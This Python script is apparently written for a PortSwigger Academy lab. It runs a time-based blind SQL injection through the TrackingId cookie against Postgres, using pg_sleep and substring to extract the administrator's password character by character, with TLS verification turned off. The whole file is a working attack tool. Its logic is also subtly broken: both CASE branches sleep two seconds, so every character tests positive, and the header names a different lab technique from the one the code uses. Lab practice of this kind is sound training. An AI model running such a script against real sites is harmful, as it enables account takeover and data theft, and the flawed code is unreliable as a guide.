#!/usr/bin/env python3
# portswigger academy blind error-based sqli
# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
# U+0A75
import socket, ssl
import re, string
import time

target_host = "whateverwhatever.web-security-academy.net"
target_port = 443

# handle large responses
def recvall(sock):
    BUFF_SIZE = 4096 # 4 KiB
    data = b''
    while True:
        part = sock.recv(BUFF_SIZE)
        if not part: # no more data
            break
        data += part
    return data

def build_http(injection):
    req = ""
    req += "GET / HTTP/1.0\r\n"
    req += "Host: {host}\r\n".format(host=target_host)
    req += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n"
    req += "Connection: close\r\n"
    req += "Cookie: TrackingId={}\r\n".format(injection)
    req += "\r\n"
    return req

def send_https(req):
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s = context.wrap_socket(sock)
    s.connect((target_host, target_port))
    s.send(req.encode())
    response = recvall(s).decode()
    return response


word = ""
pos = 1     # starting character
delay = 2   # seconds

while True:
    for char in string.printable:
        # syntax is Postgres

        query = "username='administrator'+AND+substring(password,{pos},1)='{ch}'".format(pos=pos,ch=char)
        tracking_id = "x'%3BSELECT+CASE+WHEN+({que})+THEN+pg_sleep(2)+ELSE+pg_sleep({dela})+END+FROM+users-- -".format(que=query, dela=delay)

        req = build_http(tracking_id)

        start = time.perf_counter()
        res = send_https(req)
        response_time = time.perf_counter() - start

        #print(char, str(response_time))
        
        # time until response >= 2 seconds indicates positive match
        # you can adjust the time delay depending on connection stability
        if response_time >= 2: 
            #print("[+] positive:", char)

            word += char
            pos = pos + 1
            break
        else:
            #print("[-] negative:", char)
            continue
        
    print(word)
